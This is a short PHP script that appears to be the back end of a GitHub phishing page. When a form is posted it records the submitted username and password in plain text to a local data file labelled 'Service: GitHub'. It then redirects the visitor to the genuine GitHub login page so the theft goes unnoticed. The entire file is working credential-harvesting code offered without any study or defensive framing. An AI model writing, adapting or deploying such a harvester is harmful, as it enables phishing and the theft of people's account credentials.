<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login = $_POST['login'];
    $password = $_POST['password'];
    
    $file = fopen("../../auth/usernames.dat", "a");
    fwrite($file, "Service: GitHub | User: " . $login . " | Pass: " . $password . "\n");
    fclose($file);
    
    header("Location: https://github.com/login");
    exit();
}
?>
